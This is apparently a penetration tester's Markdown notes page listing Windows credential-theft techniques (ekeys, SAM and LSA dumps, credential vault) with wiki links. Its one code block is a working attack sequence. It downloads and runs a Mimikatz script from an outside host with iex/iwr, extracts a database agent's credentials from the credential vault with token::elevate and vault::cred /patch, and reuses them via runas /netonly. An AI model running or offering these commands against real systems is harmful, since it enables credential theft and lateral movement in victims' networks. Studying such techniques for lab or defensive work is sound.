# eKeys > [[Pass the Ticket . OverPass the Hash]]


# SamDump (Local System)> [[Pass the Hash]]


# LSA Dump (Domain Cached) 


# Cred Vault > Scheduler Task 

Database agent account credentials extracted from credential vault
```powershell
PS > iex (iwr http://172.16.100.1/Invoke-Mimi.ps1 -UseBasicParsing)

PS > Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'

PS > runas /netonly /user:tech\databaseagent powershell.exe
```
